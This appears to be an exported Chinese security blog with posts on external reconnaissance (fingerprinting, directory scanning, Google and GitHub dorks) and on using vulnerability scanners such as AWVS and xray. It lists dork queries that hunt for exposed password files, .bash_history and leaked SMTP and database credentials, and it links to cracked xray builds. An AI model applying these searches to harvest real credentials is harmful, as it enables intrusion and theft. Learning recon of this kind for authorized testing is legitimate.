<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tbWJpei5xcGljLmNuL21tYml6X3BuZy8zWlg0TzFReEd0TUpkZk80bjdBNVpBNHpYYmtJR3NOZDRhell1ZlR5Y0syODloZmVEUjVta2xEbGJYdzZuRFp4RDJnaWFwNVlObUdpY05BR3IxMFBDNXBnLzY0MA?x-oss-process=image/format,png" alt="img"></p>
<h4 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h4><p>nmap -O IP地址</p>
<p>nmap -A IP地址</p>
<p>ping IP地址，观察TTL值，一般来说，Windows的TTL为128，Linux为64。一般大于100的Windows，几十到100为Linux，但是此方法不一定准确</p>
<h4 id="网站容器"><a href="#网站容器" class="headerlink" title="网站容器"></a>网站容器</h4><p>apache、nginx、tomcat、IIS</p>
<p>whatweb </p>
<h4 id="脚本类型"><a href="#脚本类型" class="headerlink" title="脚本类型"></a>脚本类型</h4><p>php、jsp、asp、aspx</p>
<p>判断方法</p>
<p>1：可以根据网站URL来判断</p>
<p>2：site:xxx  filetype:php</p>
<p>3：浏览器插件来判断 Wappalyzer</p>
<p><a href="https://www.netcraft.com/" target="_blank" rel="noopener">https://www.netcraft.com/</a></p>
<p><a href="https://sitereport.netcraft.com/?url=http%3A%2F%2Ftestphp.vulnweb.com%2F" target="_blank" rel="noopener">https://sitereport.netcraft.com/?url=http%3A%2F%2Ftestphp.vulnweb.com%2F</a></p>
<p><img src="//choge.top/2020/11/01/外网信息收集/image-20201111103805231.png" alt="image-20201111103805231"></p>
<p>whatweb </p>
<h4 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h4><p>mysql、oracle、access、sqlserver</p>
<p>端口判断</p>
<p>脚本类型做大致判断</p>
<h4 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h4><p><strong>HTTP 标头</strong></p>
<ul>
<li>标识 web 应用程序框架的最基本形式是查看 HTTP 响应标头中的 X-Powered-By  字段。</li>
</ul>
<p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/18.png" alt="img"></p>
<p><strong>c) Cookies</strong></p>
<p>确定当前 web 框架的另一个类似的、更可靠的方法是特定框架的 cookie。</p>
<p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/19.png" alt="img"></p>
<p><strong>d) HTML 源代码</strong></p>
<p>此技术基于在 HTML 页面源代码中查找某些模式。我们可以找到很多信息, 帮助测试人员识别特定的 web 应用程序。</p>
<p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/20.png" alt="img"></p>
<p><strong>e）特定文件和文件夹</strong></p>
<p>每个应用程序在服务器上都有自己的特定文件和文件夹结构。我们可以使用工具或手动访问它们。</p>
<p>扫描器</p>
<p>Test404 根据特定文件夹md5值</p>
<p><strong>f）Dirbusting 示例</strong></p>
<ul>
<li>谷歌黑客技术</li>
</ul>
<p><a href="https://ssl.microsofttranslator.com/bv.aspx?from=&to=zh-CHS&a=https%3A%2F%2Fwww.exploit-db.com%2Fghdb%2F4675%2F" target="_blank" rel="noopener">https://www.exploit-db.com/ghdb/4675/</a></p>
<p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/21-1.png" alt="img"></p>
<ul>
<li>BurpSuite 入侵</li>
</ul>
<p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/22.png" alt="img"></p>
<p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/27.png" alt="img"></p>
<p><strong>g）常见应用程序标识符</strong></p>
<p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/23.png" alt="img"></p>
<p><strong>h）Nikto</strong></p>
<p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/25-1.png" alt="img"></p>
<p><strong>i）Whatweb</strong></p>
<p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/26-1.png" alt="img"></p>
<p> (1)  云悉：<a href="http://www.yunsee.cn/info.html" target="_blank" rel="noopener">http://www.yunsee.cn/info.html</a></p>
<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p> 御剑</p>
<p>dirbuster  字典比较关键</p>
<p><img src="//choge.top/2020/11/01/外网信息收集/image-20201111163723352.png" alt="image-20201111163723352"></p>
<p>wfuzz</p>
<p>可以扫描多级目录</p>
<p>wfuzz -w /root/FuzzDicts/directoryDicts/en_dirctories_all.txt -w /root/FuzzDicts/directoryDicts/php/phpFileName.txt <a href="http://192.168.0.102/wordpress/FUZZ/FUZ2Z" target="_blank" rel="noopener">http://192.168.0.102/wordpress/FUZZ/FUZ2Z</a></p>
<p>Webdirscan</p>
<p>python2 webdirscan.py -o 1.txt -t 10 <a href="http://www.xx.com" target="_blank" rel="noopener">http://www.xx.com</a>    <em># -o 指定输出的文件，-t 指定线程数</em></p>
<p>Dirsearch</p>
<p><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p>
<p>cansina</p>
<p><a href="https://github.com/deibit/cansina" target="_blank" rel="noopener">https://github.com/deibit/cansina</a></p>
<p>dirmap</p>
<p><a href="https://github.com/H4ckForJob/dirmap" target="_blank" rel="noopener">https://github.com/H4ckForJob/dirmap</a></p>
<p>字典文件</p>
<p><a href="https://github.com/Bo0oM/fuzz.txt" target="_blank" rel="noopener">https://github.com/Bo0oM/fuzz.txt</a></p>
<p> robots.txt 文件是专门针对搜索引擎机器人robot 编写的一个纯文本文件。我们可以在这个文件中指定网站中不想被robot访问的目录。这样，我们网站的部分或全部内容就可以不被搜索引擎收录了，或者让搜索引擎只收录指定的内容。因此我们可以利用robots.txt让Google的机器人访问不了我们网站上的重要文件，GoogleHack的威胁也就不存在了。<br>假如编写的robots.txt文件内容如下：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">User-<span class="string">agent:</span> *</span><br><span class="line"><span class="string">Disallow:</span> <span class="regexp">/data/</span></span><br><span class="line"><span class="string">Disallow:</span> <span class="regexp">/db/</span><span class="string">Disallow:</span> <span class="regexp">/admin/</span></span><br><span class="line"><span class="string">Disallow:</span> <span class="regexp">/manager/</span><span class="string">Allow:</span><span class="regexp">/images/</span></span><br></pre></td></tr></table></figure>

<p>其中“Disallow”参数后面的是禁止robot收录部分的路径，例如我们要让robot禁止收录网站目录下的“data”文件夹，只需要在Disallow参数后面加上 /data/ 即可。如果想增加其他目录，只需按此格式继续添加。文件编写完成后将其上传到网站的根目录，就可以让网站远离Google Hack了。</p>
<p>虽然robots文件目的是让搜索蜘蛛不爬取想要保护的页面，但是如果我们知道了robots文件的内容的话，我们就可以知道目标网站哪些文件夹不让访问，从侧面说明这些文件夹是很重要的了。</p>
<p>(2) .SVN泄露</p>
<p>(3) .DS_Stroe文件泄露</p>
<p>(4) .hg源码泄露</p>
<h4 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h4><h4 id><a href="#" class="headerlink" title></a></h4><h4 id="Google语法"><a href="#Google语法" class="headerlink" title="Google语法"></a>Google语法</h4><p>地址</p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&amp;mid=2247483847&amp;idx=1&amp;sn=de67435015780fab4dd5832d7f1b4930&amp;chksm=eaad81faddda08ec8ed5ae134a0ecf466474ce67163212386808fb19d0471f23e3bdf7514fce&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&amp;mid=2247483847&amp;idx=1&amp;sn=de67435015780fab4dd5832d7f1b4930&amp;chksm=eaad81faddda08ec8ed5ae134a0ecf466474ce67163212386808fb19d0471f23e3bdf7514fce&amp;scene=21#wechat_redirect</a></p>
<p>intext:</p>
<p>寻找正文中含有关键字的网页，例如：<strong>intext:后台登录</strong>  将只返回正文中包含 后台登录 的网页</p>
<p>intitle:</p>
<p>寻找标题中含有关键字的网页，例如：<strong>intitle:后台登录</strong>  将只返回标题中包含 后台登录 的网页，<strong>intitle:后台登录 密码</strong> 将返回标题中包含黑客而正文中包含中国的网页</p>
<p>allintitle:</p>
<p>用法和intitle类似，只不过可以指定多个词，例如： <strong>alltitle:后台登录 管理员</strong>  将返回标题中包含后台登录 和管理员的网页</p>
<p><strong>inurl：</strong></p>
<p>将返回url中含有关键词的网页：例如：<strong>inurl:Login</strong>  将返回url中含有 Login 的网页，查找管理员登录页面inurl:/admin/login，查找数据库管理页面inurl:/phpmyadmin/index.php</p>
<p><strong>allinurl:</strong></p>
<p>用法和inurl类似，只不过可以指定多个词，例如：<strong>inurl:Login admin</strong> 将返回url中含有 Login 和 admin 的网页</p>
<p><strong>site:</strong></p>
<p>指定访问的站点，例如： <strong>site:baidu.com inurl:Login</strong>  将只在baidu.com 中查找url中含有 Login的网页</p>
<p><strong>filetype:</strong></p>
<p>指定访问的文件类型，例如：<strong>site:baidu.com filetype:pdf</strong>   将只返回baidu.com站点上文件类型为pdf的网页</p>
<p><strong>link:</strong></p>
<p>指定链接的网页，例如：<strong>link:<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></strong>  将返回所有包含指向 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 的网页</p>
<p><strong>related:</strong></p>
<p>相似类型的网页，例如：<strong>related:<a href="http://www.xjtu.edu.cn" target="_blank" rel="noopener">www.xjtu.edu.cn</a></strong> 将返回与 <a href="http://www.xjtu.edu.cn" target="_blank" rel="noopener">www.xjtu.edu.cn</a> 相似的页面，相似指的是网页的布局相似</p>
<p><strong>cache:</strong></p>
<p>网页快照，谷歌将返回给你他存储下来的历史页面，如果你同时制定了其他查询词，将在搜索结果里以高亮显示，例如：<strong>cache:<a href="http://www.hackingspirits.com" target="_blank" rel="noopener">www.hackingspirits.com</a> guest</strong> ，将返回指定网站的缓存，并且正文中含有guest</p>
<p><strong>info:</strong></p>
<p>返回站点的指定信息，例如：<strong>info:<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></strong>  将返回百度的一些信息</p>
<p><strong>define:</strong></p>
<p>返回某个词语的定义，例如：<strong>define:Hacker</strong>　　将返回关于Hacker的定义</p>
<p><strong>phonebook:</strong></p>
<p>电话簿查询美国街道地址和电话号码信息。例如：<strong>phonebook:Lisa+CA</strong> 将返回名字里面包含Lisa并住在加州的人的所有名字</p>
<p><strong>查找网站后台</strong></p>
<p>· site:xx.com intext:管理</p>
<p>· site:xx.com inurl:login</p>
<p>· site:xx.com intitle:后台</p>
<p><strong>查看服务器使用的程序</strong></p>
<p>· site:xx.com filetype:asp</p>
<p>· site:xx.com filetype:php</p>
<p>· site:xx.com filetype:jsp</p>
<p>· site:xx.com filetype:aspx</p>
<p><strong>查看上传漏洞</strong></p>
<p>· site:xx.com inurl:file</p>
<p>· site:xx.com inurl:load</p>
<p><strong>Index of</strong></p>
<p>利用 Index of  语法去发现允许目录浏览的web网站，就像在本地的普通目录一样。下面是一些有趣的查询：</p>
<p>· index of /admin</p>
<p>· index of /passwd</p>
<p>· index of /password</p>
<p>· index of /mail</p>
<p>· “index of /“ +passwd</p>
<p>· “index of /“ +password.txt</p>
<p>· “index of /“ +.htaccess</p>
<p>· “index of /root”</p>
<p>· “index of /cgi-bin”</p>
<p>· “index of /logs”</p>
<p>· “index of /config”</p>
<p><strong>inurl</strong></p>
<p>而上面这些命令中用的最多的就是 inurl: 了，利用这个命令，可以查到很多意想不到的东西</p>
<p>· 利用 allinurl:winnt/system32/ 查询：列出的服务器上本来应该受限制的诸如“system32” 等目录，如果你运气足够好，你会发现“system32” 目录里的“cmd.exe” 文件，并能执行他，接下来就是提升权限并攻克了。</p>
<p>· 查询 allinurl:wwwboard/passwd.txt  将列出所有有“WWWBoard Password vulnerability”漏洞的服务器，阅读更多请参见下面链接。</p>
<p>· 查询 inurl:.bash_history  将列出互联网上可以看见 “inurl:.bash_history” 文件的服务器。这是一个命令历史文件，这个文件包含了管理员执行的命令，有时会包含一些敏感信息比如管理员键入的密码。</p>
<p>· 查询 inurl:config.txt  将看见网上暴露了“inurl:config.txt”文件的服务器，这个文件包含了经过哈希编码的管理员的密码和数据库存取的关键信息。</p>
<p>还有一些其他一些使用“inurl:”和“allinurl:”查询组合的例子</p>
<p>· inurl:admin filetype:txt</p>
<p>· inurl:admin filetype:db</p>
<p>· inurl:admin filetype:cfg</p>
<p>· inurl:mysql filetype:cfg</p>
<p>· inurl:passwd filetype:txt</p>
<p>· inurl:”wwwroot/*.”</p>
<p>· inurl:adpassword.txt</p>
<p>· inurl:webeditor.php</p>
<p>· inurl:file_upload.php</p>
<p>· inurl:gov filetype:xls “restricted”</p>
<p>· index of ftp +.mdb allinurl:/cgi-bin/ +mailto</p>
<p>site:*.tw intext:网页底部模版信息</p>
<p>利用该方法需要一定的经验积累，以下是针定特定目标的信息收集思路。例如：对于不同的业务系统，得想出不同的联想词，例如商城系统，联想词可以为商家系统，对于大型的企业，OA登录、CRM等等的联想词。</p>
<blockquote>
<p>后台：site:xxx.xxx admin|login|system|管理|登录|内部|系统</p>
<p>钓鱼：site:xxx.xxx 邮件|email</p>
<p>社工：site:xxx.xxx qq|群|微信|腾讯</p>
<p>越权：site:xxx.xxx inurl:uid=1|userid=1</p>
<p>包含：site:xxx.xxx inurl:php?include=</p>
</blockquote>
<h4 id="github信息泄露"><a href="#github信息泄露" class="headerlink" title="github信息泄露"></a>github信息泄露</h4><p>Github的搜素语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">in</span>:name <span class="built_in">test</span>               <span class="comment">#仓库标题搜索含有关键字 SpringCloud</span></span><br><span class="line"><span class="keyword">in</span>:descripton <span class="built_in">test</span>         <span class="comment">#仓库描述搜索含有关键字</span></span><br><span class="line"><span class="keyword">in</span>:readme <span class="built_in">test</span>             <span class="comment">#Readme文件搜素含有关键字</span></span><br><span class="line">stars:&gt;3000 <span class="built_in">test</span>           <span class="comment">#stars数量大于3000的搜索关键字</span></span><br><span class="line">stars:1000..3000 <span class="built_in">test</span>      <span class="comment">#stars数量大于1000小于3000的搜索关键字</span></span><br><span class="line">forks:&gt;1000 <span class="built_in">test</span>           <span class="comment">#forks数量大于1000的搜索关键字</span></span><br><span class="line">forks:1000..3000 <span class="built_in">test</span>      <span class="comment">#forks数量大于1000小于3000的搜索关键字</span></span><br><span class="line">size:&gt;=5000 <span class="built_in">test</span>           <span class="comment">#指定仓库大于5000k(5M)的搜索关键字</span></span><br><span class="line">pushed:&gt;2019-02-12 <span class="built_in">test</span>    <span class="comment">#发布时间大于2019-02-12的搜索关键字</span></span><br><span class="line">created:&gt;2019-02-12 <span class="built_in">test</span>   <span class="comment">#创建时间大于2019-02-12的搜索关键字</span></span><br><span class="line">user:<span class="built_in">test</span>                  <span class="comment">#用户名搜素</span></span><br><span class="line">license:apache-2.0 <span class="built_in">test</span>    <span class="comment">#明确仓库的 LICENSE 搜索关键字</span></span><br><span class="line">language:java <span class="built_in">test</span>         <span class="comment">#在java语言的代码中搜索关键字</span></span><br><span class="line">user:<span class="built_in">test</span> <span class="keyword">in</span>:name <span class="built_in">test</span>     <span class="comment">#组合搜索,用户名test的标题含有test的</span></span><br></pre></td></tr></table></figure>

<p>使用 Github 进行邮件配置信息收集</p>
<p>很多网站及系统都会使用 pop3 和 smtp 发送来邮件，不少开发者由于安全意识不足会把相关的配置信息也放到Github上，所以如果这时候我们动用一下google搜索命令语句，构造一下关键字，就能把这些信息给找出来了。</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">site</span>:Github.com smtp</span><br><span class="line"><span class="attribute">site</span>:Github.com smtp <span class="variable">@qq</span>.com</span><br><span class="line"><span class="attribute">site</span>:Github.com smtp <span class="variable">@126</span>.com</span><br><span class="line"><span class="attribute">site</span>:Github.com smtp <span class="variable">@163</span>.com</span><br><span class="line"><span class="attribute">site</span>:Github.com smtp <span class="variable">@sina</span>.com.cn</span><br><span class="line"><span class="attribute">site</span>:Github.com smtp password</span><br><span class="line"><span class="attribute">site</span>:Github.com String password smtp</span><br><span class="line">我们也可以锁定域名搜索结合厂商域名 灵活运用例如搜百度的</span><br><span class="line"><span class="attribute">site</span>:Github.com smtp <span class="variable">@baidu</span>.com</span><br></pre></td></tr></table></figure>

<p>使用Github进行数据库信息收集</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">site:Github.com sa password</span><br><span class="line">site:Github.com root password</span><br><span class="line">site:Github.com<span class="built_in"> User </span><span class="attribute">ID</span>=’sa’;Password</span><br><span class="line">site:Github.com inurl:sql</span><br></pre></td></tr></table></figure>

<p>使用Github进行 SVN 信息收集</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">site:Github<span class="selector-class">.com</span> svn</span><br><span class="line">site:Github<span class="selector-class">.com</span> svn username</span><br><span class="line">site:Github<span class="selector-class">.com</span> svn password</span><br><span class="line">site:Github<span class="selector-class">.com</span> svn username password</span><br></pre></td></tr></table></figure>

<p>使用Github进行综合信息收集</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">site:Github<span class="selector-class">.com</span> password</span><br><span class="line">site:Github<span class="selector-class">.com</span> ftp ftppassword</span><br><span class="line">site:Github<span class="selector-class">.com</span> 密码</span><br><span class="line">site:Github<span class="selector-class">.com</span> 内部</span><br></pre></td></tr></table></figure>

<p>github工具</p>
<p>gsil git-all-secret gitminer</p>
<p><a href="https://github.com/UnkL4b/GitMiner" target="_blank" rel="noopener">https://github.com/UnkL4b/GitMiner</a></p>
<h4 id="网站信息泄露"><a href="#网站信息泄露" class="headerlink" title="网站信息泄露"></a>网站信息泄露</h4><p>Robots.txt</p>
<p>敏感文件扫描</p>
<p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/6-2.png" alt="img"></p>
<p>meta tag</p>
<p>Tag位于每个 HTML 文档的 HEAD 部分, 并且应该在一个 web 站点上的下述事件中保持一致：机器人/蜘蛛/爬虫的起始点不是从 webroot 以外的文档链接开始的。</p>
<p>网络蜘蛛/机器人/爬虫可以故意忽略 “<meta name="ROBOTS">” tag。</p>
<p><strong>工具</strong>: BurpSuite</p>
<p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/7-2.png" alt="img"></p>
<h4 id="审查网页评论和信息泄露的元数据"><a href="#审查网页评论和信息泄露的元数据" class="headerlink" title="审查网页评论和信息泄露的元数据"></a>审查网页评论和信息泄露的元数据</h4><p>对于程序员来说, 在源代码中添加详细注释和元数据是非常普遍的,甚至是推荐的。但是, HTML 代码中包含的注释和元数据可能会对潜在攻击者暴露内部信息。应对源代码中的注释和元数据进行审查以确定是否泄露了任何信息。</p>
<p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/10-2.png" alt="img"></p>
<h4 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h4><ul>
<li>确认并记下任何header<img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/15.png" alt="img"></li>
<li>确认哪里有重定向(300 HTTP 状态代码)，400 状态代码, 403 禁用和500内部服务器错误。</li>
</ul>
<p>一些注意事项:</p>
<ul>
<li><p>为了发现隐藏的参数, 可以使用Burpsuit的以下选项:</p>
<p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/11-2.png" alt="img"></p>
</li>
</ul>
<p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/12-2.png" alt="img"></p>
<ul>
<li><p>使用Burpsuite 和状态代码来查找它们</p>
<p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/13-2.png" alt="img"></p>
</li>
</ul>
<p>Javascript信息收集</p>
<p>burpsuite插件</p>
<p>F12查看js文件或者查看资源模块（Resource）查看可利用的js文件，比如conf.js，里面可能会涉及到一些暗藏的链接等敏感信息</p>
<p>webserver信息收集</p>
<p>通过火狐浏览器的查看元素方法，查找信息。</p>
<p> <img src="https://img2018.cnblogs.com/blog/1474078/201902/1474078-20190220215432870-1910572151.png" alt="img"></p>
<h3 id="社工信息收集"><a href="#社工信息收集" class="headerlink" title="社工信息收集"></a>社工信息收集</h3><h4 id="员工信息收集"><a href="#员工信息收集" class="headerlink" title="员工信息收集"></a>员工信息收集</h4><p>image-20201112162745573.png</p>
<h4 id="邮箱收集"><a href="#邮箱收集" class="headerlink" title="邮箱收集"></a>邮箱收集</h4><h1 id="SimplyEmail"><a href="#SimplyEmail" class="headerlink" title="SimplyEmail"></a>SimplyEmail</h1><p><a href="https://github.com/SimplySecurity/SimplyEmail/archive/master.zip" target="_blank" rel="noopener">https://github.com/SimplySecurity/SimplyEmail/archive/master.zip</a></p>
<p>20201112163818486.png</p>
<p>注意密码次数</p>
<p>20201112163959472.png</p>
<h4 id="字典创建"><a href="#字典创建" class="headerlink" title="字典创建"></a>字典创建</h4><h4 id="TG机器人"><a href="#TG机器人" class="headerlink" title="TG机器人"></a>TG机器人</h4><h3 id="其他信息收集"><a href="#其他信息收集" class="headerlink" title="其他信息收集"></a>其他信息收集</h3><p>重要</p>
<p>App</p>
<p>微信小程序</p>
<p>微信公众号</p>
<p>天眼查，企查查，企信宝</p>
<p>微博，抖音</p>
<p>根据找到的信息再做信息收集发现</p>
<p>20201112170533441.png</p>
<p>参考</p>
<p><a href="https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md" target="_blank" rel="noopener">https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md</a></p>
<p><a href="https://github.com/Mr-xn/Penetration_Testing_POC" target="_blank" rel="noopener">https://github.com/Mr-xn/Penetration_Testing_POC</a></p>
<p><a href="https://github.com/k8gege/K8tools" target="_blank" rel="noopener">https://github.com/k8gege/K8tools</a></p>
<p>Tomcat 弱口令扫描器</p>
<p><a href="https://github.com/magicming200/tomcat-weak-password-scanner" target="_blank" rel="noopener">https://github.com/magicming200/tomcat-weak-password-scanner</a></p>
<p>根据nmap脚本解析 自动扫描器</p>
<p><a href="https://github.com/x90skysn3k/brutespray" target="_blank" rel="noopener">https://github.com/x90skysn3k/brutespray</a></p>
<p><img src="//choge.top/2020/11/01/外网信息收集/image-20201126154447928.png" alt="image-20201126154447928"></p>
<p>字典文件。pmaowu</p>
<p><a href="https://github.com/pmiaowu/PmWebDirScan/tree/master/dict" target="_blank" rel="noopener">https://github.com/pmiaowu/PmWebDirScan/tree/master/dict</a></p>
<p><a href="https://github.com/TheKingOfDuck/fuzzDicts" target="_blank" rel="noopener">https://github.com/TheKingOfDuck/fuzzDicts</a></p>
<p>k8字典。 gituhub搜索</p>
<p>日本大神 字典</p>
<p><a href="https://github.com/TuuuNya/fuzz_dict" target="_blank" rel="noopener">https://github.com/TuuuNya/fuzz_dict</a></p>
<p>子域名</p>
<p><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">https://github.com/shmilylty/OneForAll</a></p>
<p><a href="https://github.com/lijiejie/subDomainsBrute/" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute/</a></p>
<p>子域名监控工具</p>
<p><a href="https://github.com/yassineaboukir/sublert" target="_blank" rel="noopener">https://github.com/yassineaboukir/sublert</a></p>
<p>搭建参考</p>
<p><a href="https://www.sohu.com/a/303652848_120055360" target="_blank" rel="noopener">https://www.sohu.com/a/303652848_120055360</a></p>
<p>护网自动化利用脚本github</p>
<p><a href="https://github.com/0x9f99/Recon" target="_blank" rel="noopener">https://github.com/0x9f99/Recon</a></p>
<p>子域名工具</p>
<p><a href="https://github.com/projectdiscovery/subfinder/" target="_blank" rel="noopener">https://github.com/projectdiscovery/subfinder/</a></p>
<p>自动化工具</p>
<p><a href="https://github.com/broken5/WebAliveScan" target="_blank" rel="noopener">https://github.com/broken5/WebAliveScan</a></p>
<p>外网信息收集</p>
<p><img src="//choge.top/2020/11/01/外网信息收集/image-20201203164957124.png" alt="image-20201203164957124"></p>
<p>几款子域名工具比较</p>
<p>xray5691条</p>
<p><img src="//choge.top/2020/11/01/外网信息收集/image-20201203192520442.png" alt="image-20201203192520442"></p>
<p>sublist3r含爆破功能1757</p>
<p><img src="//choge.top/2020/11/01/外网信息收集/image-20201203193158788.png" alt="image-20201203193158788"></p>
<p>subDomainsBrute   423个</p>
<p><img src="//choge.top/2020/11/01/外网信息收集/image-20201203192733600.png" alt="image-20201203192733600"></p>
<p>oneforall  56147</p>
<p><img src="//choge.top/2020/11/01/外网信息收集/image-20201203193445675.png" alt="image-20201203193445675"></p>
<p>去除重复项后。28069  因为http和https</p>
<p><img src="//choge.top/2020/11/01/外网信息收集/image-20201203194614115.png" alt="image-20201203194614115"></p>
<p>指纹</p>
<p><img src="//choge.top/2020/11/01/外网信息收集/image-20201203213257482.png" alt="image-20201203213257482"></p>
<p>子域名</p>
<p><a href="https://github.com/projectdiscovery/subfinder/" target="_blank" rel="noopener">https://github.com/projectdiscovery/subfinder/</a></p>
]]></content>
  </entry>
  <entry>
    <title>主流漏洞扫描器使用</title>
    <url>/2020/10/28/%E4%B8%BB%E6%B5%81%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>本文主要总结下各类主流扫描器使用，包含Nessus，AWVS，Appscan，Burpsuite，Xray，Goby等</p><p>本文测试网站为<a href="http://testphp.vulnweb.com/" target="_blank" rel="noopener">http://testphp.vulnweb.com/</a></p><h3 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h3><p>AWVS使用docker镜像安装如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  pull 拉取下载镜像</span></span><br><span class="line">docker pull secfa/docker-awvs</span><br><span class="line"><span class="comment">#  将Docker的3443端口映射到物理机的 13443端口</span></span><br><span class="line">docker run -it -d -p 13443:3443 secfa/docker-awvs</span><br><span class="line"><span class="comment"># 容器的相关信息</span></span><br><span class="line">awvs13 username: admin@admin.com</span><br><span class="line">awvs13 password: Admin123</span><br><span class="line">AWVS版本：13.0.200217097</span><br></pre></td></tr></table></figure><a id="more"></a>




<p>扫描结果如下</p>
<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201030122336380.png" alt="image-20201030122336380"></p>
<h3 id="Appscan"><a href="#Appscan" class="headerlink" title="Appscan"></a>Appscan</h3><p>扫描结果</p>
<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031161243870.png" alt="image-20201031161243870"></p>
<p>漏洞扫描能力对比Burpsuite</p>
<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031162612509.png" alt="image-20201031162612509"></p>
<h3 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h3><h4 id="破解程序参考如下"><a href="#破解程序参考如下" class="headerlink" title="破解程序参考如下"></a>破解程序参考如下</h4><p><a href="https://github.com/zu1k/xray-crack" target="_blank" rel="noopener">https://github.com/zu1k/xray-crack</a></p>
<p><a href="https://github.com/Lz1y/xray-crack/releases/tag/v1.0" target="_blank" rel="noopener">https://github.com/Lz1y/xray-crack/releases/tag/v1.0</a></p>
<p><a href="https://harvey-blog.com/Safety/1610" target="_blank" rel="noopener">https://harvey-blog.com/Safety/1610</a></p>
<h4 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h4><h5 id="基础爬虫模式"><a href="#基础爬虫模式" class="headerlink" title="基础爬虫模式"></a>基础爬虫模式</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">./xray_darwin_amd64 webscan --basic-crawler http://testphp.vulnweb.com --html-output 1.html</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201030121930377.png" alt="image-20201030121930377"></p>
<p>查看xray官方服务扫描文档如下</p>
<p>参数配置目前比较简单，输入支持两种方式，例如:</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">快速检测单个目标</span><br><span class="line">./xray servicescan --<span class="keyword">target</span> <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8009</span></span><br><span class="line"></span><br><span class="line">批量检查的 <span class="number">1</span>.<span class="keyword">file</span> 中的目标, 一行一个目标，带端口</span><br><span class="line">./xray servicescan --<span class="keyword">target</span>-<span class="keyword">file</span> <span class="number">1</span>.<span class="keyword">file</span> </span><br><span class="line">CopyErrorCopied</span><br></pre></td></tr></table></figure>

<p>其中 1.file 的格式为一个行一个 service，如</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">10<span class="selector-class">.3</span><span class="selector-class">.0</span><span class="selector-class">.203</span><span class="selector-pseudo">:8009</span></span><br><span class="line">127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span><span class="selector-pseudo">:8009CopyErrorCopied</span></span><br></pre></td></tr></table></figure>

<p>也可以将结果输出到报告或json文件中</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">将检测结果输出到 html 报告中</span><br><span class="line"><span class="string">./xray</span> servicescan <span class="params">--target</span> 127.0.0.1<span class="function">:8009</span> <span class="params">--html-output</span> service.html</span><br><span class="line"><span class="string">./xray</span> servicescan <span class="params">--target-file</span> 1.file <span class="params">--html-output</span> service.html</span><br><span class="line"></span><br><span class="line">将检测结果输出到 json 文件中</span><br><span class="line"><span class="string">./xray</span> servicescan <span class="params">--target</span> 127.0.0.1<span class="function">:8099</span> <span class="params">--json-output</span> 1.json</span><br></pre></td></tr></table></figure>

<p>批量检查的 1.file 中的目标, 一行一个目标，带端口 ./xray servicescan –target-file 1.file </p>
<p>只需要将上述servicescan替换成webscan即批量扫描漏洞。</p>
<p>批量扫描漏洞结果如下</p>
<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20210222172134907.png" alt="image-20210222172134907">s</p>
<h3 id="Goby"><a href="#Goby" class="headerlink" title="Goby"></a>Goby</h3><p>扫描如下，goby使用过程中感觉适合做内网探测</p>
